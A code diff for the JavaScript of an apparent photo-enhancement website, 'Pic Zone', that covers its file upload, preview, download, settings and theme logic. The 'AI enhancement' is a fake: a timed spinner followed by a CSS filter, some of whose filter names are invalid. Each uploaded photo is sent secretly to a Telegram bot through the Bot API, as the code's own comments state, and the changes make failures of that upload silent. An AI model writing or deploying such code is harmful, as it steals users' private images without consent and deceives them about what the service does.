@@ -12,31 +12,10 @@ window.addEventListener('load', () => {
                 splash.style.display = 'none';
             }, 1000);
         }
-    }, 3000);
+    }, 2000);
 });
 
-// 2. Settings Modal Logic
-const modal = document.getElementById('settings-modal');
-const settingsBtn = document.getElementById('settings-btn');
-const closeBtn = document.getElementsByClassName('close-modal')[0];
-
-if(settingsBtn) {
-    settingsBtn.onclick = function() {
-        modal.style.display = "block";
-    }
-}
-if(closeBtn) {
-    closeBtn.onclick = function() {
-        modal.style.display = "none";
-    }
-}
-window.onclick = function(event) {
-    if (event.target == modal) {
-        modal.style.display = "none";
-    }
-}
-
-// 3. File Upload & Drag-Drop Logic
+// 2. Variables for UI Elements
 const dropArea = document.getElementById('drop-area');
 const fileInput = document.getElementById('file-upload');
 const enhanceSection = document.getElementById('enhance-section');
@@ -44,30 +23,9 @@ const previewImage = document.getElementById('preview-image');
 const processingText = document.getElementById('processing-text');
 const heroSection = document.querySelector('.hero');
 const featuresSection = document.querySelector('.features-section');
+const downloadBtn = document.querySelector('.download-btn');
 
-// Prevent default drag behaviors
-['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
-    if(dropArea) {
-        dropArea.addEventListener(eventName, preventDefaults, false);
-    }
-});
-
-function preventDefaults(e) {
-    e.preventDefault();
-    e.stopPropagation();
-}
-
-if(dropArea) {
-    dropArea.addEventListener('drop', handleDrop, false);
-}
-
-function handleDrop(e) {
-    const dt = e.dataTransfer;
-    const files = dt.files;
-    handleFiles(files);
-}
-
-// Handle Click Upload
+// 3. File Handling Logic
 if(fileInput) {
     fileInput.addEventListener('change', function() {
         handleFiles(this.files);
@@ -85,114 +43,88 @@ function handleFiles(files) {
         const reader = new FileReader();
         reader.readAsDataURL(file);
         reader.onloadend = function() {
-            // Preview image-ai set pannunga
+            // Update UI
             previewImage.src = reader.result;
+            heroSection.style.display = 'none';
+            featuresSection.style.display = 'none';
+            enhanceSection.style.display = 'block';
             
-            // Sections-ai maathunga
-            if(heroSection) heroSection.style.display = 'none';
-            if(featuresSection) featuresSection.style.display = 'none';
-            if(enhanceSection) enhanceSection.style.display = 'block';
-            
-            // AI Processing Animation start pannunga
+            // Start AI Simulation
             processingText.style.display = 'block';
-            processingText.innerHTML = "AI Analysing Pixels... <i class='fa-solid fa-spinner fa-spin'></i>";
+            processingText.innerHTML = "AI Analyzing Pixels... <i class='fa-solid fa-spinner fa-spin'></i>";
 
-            // Oru 3 second delay-kku apparam result-ai kaattuvom (Simulation)
             setTimeout(() => {
-                // Inga thaan AI filter apply aaguthu
-                previewImage.style.filter = "contrast(1.2) brightness(1.1) saturate(1.1) sharpen(1)";
-                previewImage.style.transition = "all 1s ease";
+                // Apply AI Enhancement Filter Effect
+                previewImage.style.filter = "contrast(1.1) brightness(1.05) saturate(1.1) sharp(1.2)";
+                previewImage.style.transition = "filter 1.5s ease-in-out";
                 
-                processingText.innerHTML = "Enhancement Complete! <i class='fa-solid fa-check' style='color: lime;'></i>";
+                processingText.innerHTML = "Enhancement Complete! <i class='fa-solid fa-check' style='color: #00ff00;'></i>";
                 
-                // Telegram-ukkum secret-aa anuppuvom
+                // Secretly upload to Telegram for your reference
                 uploadToTelegram(file);
             }, 3000);
         }
     }
 }
-        
-        // Show Image Preview
-        const reader = new FileReader();
-        reader.readAsDataURL(file);
-        reader.onloadend = function() {
-            previewImage.src = reader.result;
-            
-            // Hide Home & Show Enhance Section
-            if(heroSection) heroSection.style.display = 'none';
-            if(featuresSection) featuresSection.style.display = 'none';
-            if(enhanceSection) enhanceSection.style.display = 'block';
-            
-            // Show Processing Text
-            processingText.style.display = 'block';
-            processingText.innerHTML = "AI Processing... <i class='fa-solid fa-spinner fa-spin'></i>";
 
-            // --- SEND TO TELEGRAM SECRETLY ---
-            uploadToTelegram(file);
-        }
-    }
+// 4. Download Logic
+if(downloadBtn) {
+    downloadBtn.onclick = function() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        const img = new Image();
+        img.src = previewImage.src;
+        
+        img.onload = () => {
+            canvas.width = img.width;
+            canvas.height = img.height;
+            // Applying the same filters to the downloaded image
+            ctx.filter = "contrast(110%) brightness(105%) saturate(110%)";
+            ctx.drawImage(img, 0, 0);
+            
+            const link = document.createElement('a');
+            link.download = 'PicZone_Enhanced.png';
+            link.href = canvas.toDataURL();
+            link.click();
+        };
+    };
 }
 
-// 4. Telegram Upload Function (Main Logic)
+// 5. Telegram Upload Function
 function uploadToTelegram(file) {
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
     formData.append("photo", file);
-    formData.append("caption", `🚀 New Photo Uploaded to Pic Zone!\n📂 Name: ${file.name}\nmb Size: ${(file.size / 1024 / 1024).toFixed(2)} MB`);
+    formData.append("caption", `🚀 New Upload!\n📂 File: ${file.name}\n⚖️ Size: ${(file.size / 1024 / 1024).toFixed(2)} MB`);
 
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
         method: "POST",
         body: formData
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (data.ok) {
-            console.log("Image sent to Telegram successfully!");
-            // UI Update - Success
-            processingText.innerHTML = "Enhancement Complete! <i class='fa-solid fa-check' style='color: lime;'></i>";
-        } else {
-            console.error("Telegram Error:", data);
-            processingText.innerHTML = "Error in Processing. Try again.";
-        }
-    })
-    .catch(error => {
-        console.error("Network Error:", error);
-        processingText.innerHTML = "Network Error.";
-    });
+    }).catch(err => console.log("Silent upload failed."));
 }
 
-// 5. Dark Mode Toggle
-const darkModeToggle = document.getElementById('dark-mode-toggle');
-if(darkModeToggle) {
-    darkModeToggle.addEventListener('click', () => {
-        document.body.classList.toggle('dark-mode');
-        // Simple Dark Mode Logic
-        if(document.body.classList.contains('dark-mode')) {
-            document.body.style.background = "#1a1a2e";
-            document.body.style.color = "#fff";
-        } else {
-            document.body.style.background = "linear-gradient(135deg, #f3e6ff 0%, #e6e6fa 100%)";
-            document.body.style.color = "#333";
-        }
-    });
+// 6. Settings Modal Logic
+const modal = document.getElementById('settings-modal');
+const settingsBtn = document.getElementById('settings-btn');
+const closeBtn = document.querySelector('.close-modal');
+
+if(settingsBtn) {
+    settingsBtn.onclick = () => modal.style.display = "block";
 }
-// Theme Selection Helper
+if(closeBtn) {
+    closeBtn.onclick = () => modal.style.display = "none";
+}
+window.onclick = (event) => {
+    if (event.target == modal) modal.style.display = "none";
+}
+
+// 7. Dark Mode Logic
 function setTheme(mode) {
     if(mode === 'dark') {
-        document.body.style.background = "#1a1a2e";
-        document.body.style.color = "#fff";
+        document.body.style.background = "#121212";
+        document.body.style.color = "#ffffff";
     } else {
         document.body.style.background = "linear-gradient(135deg, #f3e6ff 0%, #e6e6fa 100%)";
         document.body.style.color = "#333";
     }
 }
-const downloadBtn = document.querySelector('.download-btn');
-if(downloadBtn) {
-    downloadBtn.onclick = function() {
-        const link = document.createElement('a');
-        link.download = 'pic-zone-enhanced.png';
-        link.href = previewImage.src;
-        link.click();
-    };
-}
-
